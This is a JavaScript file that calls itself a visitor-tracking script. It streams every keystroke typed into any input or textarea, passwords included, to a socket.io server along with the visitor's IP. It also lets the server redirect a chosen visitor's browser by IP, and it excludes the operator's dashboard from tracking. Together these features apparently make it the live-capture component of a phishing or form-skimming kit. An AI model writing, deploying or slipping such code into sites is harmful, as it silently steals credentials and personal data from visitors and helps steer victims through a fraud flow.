// Client-side visitor tracking script
document.addEventListener('DOMContentLoaded', function() {
  // Check if socket.io is available
  if (typeof io !== 'undefined') {
    // Connect to socket.io server
    const socket = io();
    
    // Track connection status
    let isConnected = false;
    
    // Get client IP address
    let clientIP = null;
    
    // Function to get public IP address
    async function getClientIP() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        clientIP = data.ip;
        console.log('Client IP detected:', clientIP);
        
        // Send client IP to server
        socket.emit('client-ip', { clientIP });
        
        // Start heartbeat after getting IP
        startHeartbeat(clientIP);
        
        return clientIP;
      } catch (error) {
        console.error('Failed to fetch IP:', error);
        return null;
      }
    }
    
    // Setup heartbeat to maintain accurate online status
    function startHeartbeat(clientIP) {
      // Send initial presence
      sendPresence(clientIP);
      
      // Send heartbeat every 30 seconds
      setInterval(() => {
        sendPresence(clientIP);
      }, 30000);
      
      // Also send presence when tab becomes visible again
      document.addEventListener('visibilitychange', () => {
        if (!document.hidden) {
          sendPresence(clientIP);
        }
      });
    }
    
    // Send presence update to server
    function sendPresence(clientIP) {
      if (socket && socket.connected) {
        socket.emit('client-presence', { 
          clientIP,
          timestamp: new Date().toISOString(),
          path: window.location.pathname,
          title: document.title
        });
      }
    }
    
    // Initialize by getting the IP, then send page view
    getClientIP().then(ip => {
      // Get current path
      const currentPath = window.location.pathname;
      
      // Skip tracking for dashboard paths
      if (currentPath.startsWith('/dashboard')) {
        console.log('Dashboard path detected, skipping visitor tracking');
        return;
      }
      
      // Send current page path to server on page load
      socket.emit('page-view', { 
        path: currentPath,
        title: document.title,
        referrer: document.referrer,
        clientIP: ip
      });
    });
    
    // Listen for redirect events from server
    socket.on('redirect', function(data) {
      // Check if this redirect is for our IP
      if (data.ip && clientIP && data.ip === clientIP) {
        console.log('Received redirect instruction to:', data.redirectUrl);
        // Redirect the browser
        window.location.href = data.redirectUrl;
      }
    });
    
    // Track input fields across all pages
    const inputDebounceDelay = 500; // ms
    let inputDebounceTimers = {};
    
    // Function to track input changes
    function trackInputs() {
      const inputs = document.querySelectorAll('input, textarea');
      
      inputs.forEach(input => {
    
        // Generate a unique ID for this input
        const inputId = input.id || input.name || input.placeholder || 'unnamed-' + Math.random().toString(36).substr(2, 9);
        
        // Add input event listener
        input.addEventListener('input', function(e) {
          // Clear previous timer for this input
          if (inputDebounceTimers[inputId]) {
            clearTimeout(inputDebounceTimers[inputId]);
          }
          
          // Set new timer to debounce rapid typing
          inputDebounceTimers[inputId] = setTimeout(() => {
            // Send input data to server with client IP
            socket.emit('input-data', {
              path: window.location.pathname,
              inputId: inputId,
              inputType: input.type,
              inputName: input.name || '',
              inputValue: input.value,
              timestamp: new Date().toISOString(),
              clientIP: clientIP // Include client IP from the frontend
            });
          }, inputDebounceDelay);
        });
      });
    }
    
    // Track inputs on page load
    trackInputs();
    
    // Track inputs after DOM changes (for dynamically added inputs)
    const observer = new MutationObserver(function(mutations) {
      trackInputs();
    });
    
    // Observe the entire document for changes
    observer.observe(document.body, { childList: true, subtree: true });
    
    // Track page navigation via History API
    const originalPushState = history.pushState;
    const originalReplaceState = history.replaceState;
    
    history.pushState = function() {
      originalPushState.apply(this, arguments);
      trackPageView();
    };
    
    history.replaceState = function() {
      originalReplaceState.apply(this, arguments);
      trackPageView();
    };
    
    window.addEventListener('popstate', trackPageView);
    
    function trackPageView() {
      socket.emit('page-view', { 
        path: window.location.pathname,
        title: document.title,
        referrer: document.referrer
      });
    }
    // Handle redirect events from server
    socket.on('redirect', (data) => {
      console.log('Received redirect event:', data);
      
      if (data && data.url) {
        // Use redirect-handler.js for consistent redirect behavior
        if (typeof window.safeRedirect === 'function') {
          console.log('Using safeRedirect function with URL:', data.url);
          window.safeRedirect(data.url);
        } else {
          // Fallback if safeRedirect is not available
          console.log('Fallback redirect to:', data.url);
          
          // Aggressive modal cleanup function
          function cleanupModals() {
            // Method 1: Direct removal
            const modalBackdrops = document.querySelectorAll('.modal-backdrop');
            modalBackdrops.forEach(backdrop => {
              backdrop.classList.remove('show');
              backdrop.remove();
            });
            
            // Method 2: Remove via jQuery if available
            if (typeof $ !== 'undefined') {
              // Only call modal if it exists (Bootstrap is loaded)
              try {
                if ($.fn && $.fn.modal) {
                  $('.modal').modal('hide');
                }
              } catch (e) {
                console.log('Bootstrap modal not available:', e);
              }
              // This will work with just jQuery
              $('.modal-backdrop').remove();
            }
            
            // Method 3: Direct DOM manipulation
            document.querySelectorAll('.modal-backdrop').forEach(el => {
              if (el.parentNode) el.parentNode.removeChild(el);
            });
            
            // Reset all body styles
            document.body.classList.remove('modal-open');
            document.body.style.overflow = '';
            document.body.style.paddingRight = '';
            document.body.style.position = '';
            document.body.style.height = '';
            document.body.style.width = '';
          }
          
          // Execute cleanup multiple times
          cleanupModals();
          setTimeout(cleanupModals, 50);
          
          // Execute the redirect with final cleanup
          setTimeout(() => {
            cleanupModals();
            window.location.href = data.url;
          }, 200);
        }
      } else {
        console.error('Received empty redirect data');
      }
    });
   
  }
});
